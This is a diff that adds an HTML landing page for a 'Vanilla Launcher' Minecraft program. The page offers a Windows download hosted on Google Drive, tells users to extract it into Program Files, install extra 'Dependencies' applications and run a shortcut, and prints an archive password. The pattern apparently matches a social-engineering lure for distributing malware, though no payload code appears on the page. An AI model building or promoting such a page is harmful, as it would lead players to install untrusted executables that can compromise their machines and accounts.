@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Fast and stable Minecraft launcher for version 1.21.8. Download now!">
+  <title>Vanilla Launcher</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #121212;
+      color: #fff;
+    }
+    .hero {
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 500px;
+      background: url('https://www.minecraft.net/content/dam/minecraftnet/franchise/component-library/downloadHeroA/MCV_HOL25Drop_MoM_DotNet_Downloads_272x655.png') center/cover no-repeat;
+      text-align: center;
+      color: #fff;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 0;
+    }
+    .hero-content {
+      position: relative;
+      z-index: 1;
+      padding: 20px;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 1s forwards;
+    }
+    @keyframes fadeInUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .download-btn {
+      background-color: #00bf0d;
+      color: #fff;
+      font-weight: bold;
+      padding: 15px 35px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background 0.3s, transform 0.2s;
+    }
+    .download-btn:hover { background-color: #00a10b; transform: scale(1.05); }
+    .features {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      background-color: #1b1b1b;
+      padding: 50px 20px;
+    }
+    .feature {
+      flex: 1 1 250px;
+      margin: 20px;
+      text-align: center;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 1s forwards;
+    }
+    .feature img { width: 60px; margin-bottom: 15px; }
+    .feature h3 { font-size: 1.2em; margin-bottom: 10px; color: #fff; }
+    .feature p { color: #ccc; font-size: 0.95em; }
+    footer { text-align: center; padding: 20px; background-color: #121212; color: #888; }
+    @media (max-width: 768px) { .features { flex-direction: column; align-items: center; } }
+  </style>
+</head>
+<body>
+
+  <section class="hero">
+    <div class="hero-content">
+      <h1>Play Minecraft with Vanilla Launcher</h1>
+      <p>Launch Minecraft 1.21.8 in just 00:29.30 seconds. Fast, stable, and ready to play!</p>
+      <a href="https://drive.google.com/uc?export=download&id=1gV_0NAv12lFykKKwqeAFqtOJxEuK1N6A" class="download-btn">Download for Windows</a>
+    </div>
+  </section>
+  <section class="features">
+    <div class="feature" style="animation-delay: 0.3s;">
+      <h3>Vanilla Minecraft</h3>
+      <p>Runs the official, unmodified Minecraft 1.21.8 for stability.</p>
+    </div>
+    <div class="feature" style="animation-delay: 0.6s;">
+      <h3>Ultra-Fast Launch</h3>
+      <p>Start Minecraft in just 00:29.30 seconds with no waiting.</p>
+    </div>
+    <div class="feature" style="animation-delay: 0.9s;">
+      <h3>Official Updates</h3>
+      <p>Always up-to-date with the latest stable Minecraft release.</p>
+    </div>
+    <div class="feature" style="animation-delay: 0.9s;">
+      <h3>How to use</h3>
+      <p>Extract the file in "C:\Program Files\", install the applications from the Dependencies folder and run the Vanilla Launcher.ink </p>
+    </div>
+    <div class="feature" style="animation-delay: 0.9s;">
+      <h3>Client online-server Passwords</h3>
+      <p>alexmax2</p>
+    </div>
+  </section>
+
+  <footer>
+    &copy; 2025 Vanilla Launcher. All rights reserved.
+  </footer>
+
+</body>
+</html>
